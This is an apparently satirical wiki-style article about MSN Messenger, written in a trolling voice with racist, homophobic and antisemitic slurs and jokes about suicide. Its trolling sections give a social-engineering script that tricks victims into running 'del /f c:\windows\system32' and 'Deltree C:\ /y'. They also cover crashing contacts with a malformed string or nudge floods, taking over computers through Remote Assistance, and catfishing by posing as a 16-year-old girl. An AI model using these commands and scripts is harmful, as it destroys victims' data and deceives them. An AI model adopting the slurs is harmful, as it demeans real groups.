[[Image:Butterfly.jpg|thumb|Yes, it is a little gay, isn't it?]]
'''MSN''' is [[THE BEST|the most]] [[popular]](and worst) instant messaging program on the [[Internet]] (and it's also a protocol, [[retard]]). The name is derived from the abbreviation of ''[[Microsoft|Micro<b>s</b>oft]] Network'', and commonly misinterpreted as ''Male Sex Network''. The program is also known as "teenagers who used up all their [[ghetto]] pre-paid minutes can instead communicate with each other instantly in the following manner": 

{{quote3|
[[Emo|<b>♥  LOCK & LOAD;LIANA.    said:</b>]] i fxcking hate you.<br>
[[Wigger|<b>CNT SNiFF ME BUT I AM DOPE NIGUHH said:</b>]]...fuk u emo ill kik yur azz.<br>
[[Scene|<b>&&____xKilledHannahRudeBoii- said:</b>]] go listen to senses fail, bettchhxcore.<br>
[[Slut|<b>(R) ♥♥•ø·¸¸.·´°¤SaMmIe Is SxCy ByYtChEsZz¤°`·.¸¸·ø•♥ said:</b>]] ..:: You Are Such An Emo, I H8 U;;<br>
}}

Such drivel is typically meaningless in nature, and should be disregarded by those who unwisely encounter it. The above example is considered a bad one, considering the high chance of the 'Liana' girl [[Permaban|permabanning herself from life]], lulz. Many users result to blocking each other after petty yet hilarious fights, and complain to their unblocked friends about how much time they are wasting on the [[Chameleon|stupidity of MSN's users]].

Others use it as a shameless means of self-promotion through their user names, a [[pretentious]] way of whoring out their [[MySpace]], [[DeviantART]] accounts, and presence on [[LiveJournal|other]] [[Facebook|similar]] [[YouTube|websites]].  

MSN also provides internet access which is about as shitty as [[AOL]]. The only difference is that MSN will not steal your money and spend it on prostitutes for their worker's rape. Most [[13 year old boys]] who join MSN are those who had their AOL account deleted for uploading [[porn]], [[beastiality]] and illegal music and movies.

==Proper Trolling of MSN==
[[Image:TypicalconvoWHAT.jpg|thumb|Typical MSN conv[[wat|WAT]]]]
If a user copypastas the text <b>n—a_Á—ay±m—aÁÇáç±Çáß±Çá§ÁaÇáÇ±OÇá—±Çá§±Çár×ÁÇ á+NÇ áLáÇá</b> into their personal message, epic win will result as they log out never to log back in again. Other possible outcomes [[shit nobody cares about|depending on the version of MSN that your victim has]] include someone's entire contact list being deleted, inability to sign off [[time paradox|even though their internet is disconnected]], and a whole lot of [[butthurt]].  Microsoft, for some reason, is completely oblivious of this bug, and so you can appear to be a [[Hackers on Steroids|elite hacker]] by using it.  When used on a phished account, tell people that by putting this code in their MSN name, they can hack into the account of everyone on their friends list.
*You can also say that it makes their MSN name glow colours/rainbow/etc; works best on the type of people who configure their MSN names with random symbols.
*It makes the version of MSN on [insert their operating system here] update to a SUPER SEEKRIT new version not released to the public yet; works best on [[geeks]]
*You can notify Their account is sending out spam and this is an easy way to stop it

However, for best results, observe the work of /i/nsurgents who combined trolling [http://www.freechatnow.com FreeChatNow] with this MSN bug, shown left.

'''Note that none of the above will work with the newest versions of MSN.'''

<b>THIS JUST IN:</b> If you get sent [[Internet Disease|New_Girl_JPG]].zip randomly, usually with an accompanying message of something [[gay]] that your [[friend]] would never actually say such as "Omg!! Have you seen this? I did a [[MySpace]] search for the new girl in year 10.... and she had these fotos of you and her! [[WTF]]?!", <b>don't accept it, you [[douche]]</b>. [[At least 100|One hundred percent]] of these are viruses that will infect your MSN and send these messages to all of <i>your</i> contacts. This virus has thus cemented its place as the [[AIDS]] of the instant messenger. To make the matters worse this virus is a secret weapon of teh [[Jews]] which in association with the Furies are trying to take over our [[Internets]] and steal teh [[LULZ]] from us.

==Owning people's computers via MSN==
===The Temporary Version===
#Get [http://msgpluslive.net Messenger Plus]
#Get [http://www.msgpluslive.net/scripts/view/277-NudgesToolsScript/ Nudges Tools Script 1.1] and install it
#Turn off nudges (You will still be able to send them, thanks to the script)
#Invite loads of people into a convo
#Type '''/sendnudge 40000 100'''. [[Shit nobody cares about|This will send 40,000 nudges which will own their computer and they will probably have to restart (unless they have a shitload of RAM and are able to exit MSN)]]
#[[????]]
#[[PROFIT]]!!
*You can also increase the amount of runtime taken up by using an auto spammer to send countless offensive messages.

===The Permanent Fucking [[PWN]]===
[[Image:Pedomsncombo.jpg|thumb|[[Chris Forcand|Watch and learn.]]]]
#Inform somebody that their MSN account is sending out [[spam]] viruses, and that if they don't fix it, you'll have to report them to Microsoft and have their account deleted. Conveniently offer them a way to fix it, if they have a Windows computer.
#Talk them through this: "Click on your Start menu, then All Programs, and look for something called 'Run', usually be under the All Programs menu, or under Accessories." Once they tell you they have that open, tell them to type 'cmd', then on the next thing that comes up, type '''del /f c:\windows\system32''', then '''C:> Deltree C:\ /y'''.
*If they're skeptical about this, tell them that if they go in through Windows Explorer, there's a [[legit|System]] folder and a [[System32]] folder. The [[virus|System32]] folder is the one that the virus makes to try to trick you into not deleting it. The virus makes it so that you can't delete System32 from Windows Explorer, but with this thing you're doing, it'll delete the virus and remove it from your computer.

===Remote Assistance===
*This can result in serious pwnage of someone's computer, but they have to either trust you, be a complete retard, or be drunk. Whilst in the conversation window with someone "Request remote assistance". This will be found on the top somewhere. You might have to ask them to request it instead, because on some versions of MSN you can only ask for them to give you "remote assistance". ''That'' is epic fail and they will probably crash your computer resulting in self-pwnage. However, if done correctly, you'll have free control over their computer. [[Delete fucking everything|What to do then is up to you]].

==Just for the Record==
Getting [[fucktards]] from a [[chat]] [http://www.teenssite.co.uk/ site] with the promise of being a [[OMG | OMG hot]] [[16 year old girl]] on webcam can result in much [[lulz]] being generated by their retarded sexual efforts at conversation and the lulz-perpetrator showing their hairy ball-sack on webcam as opposed to the "hot, wet pussy" they promised.

Also, make sure the first person you try to expose isn't a fucking computer engineer or if he is, make sure he's really stupid, otherwise massive amounts of [[fail]] could possibly turn you into [[an hero]].

== MSN on [[Linux]] ==

You're really fucked now.
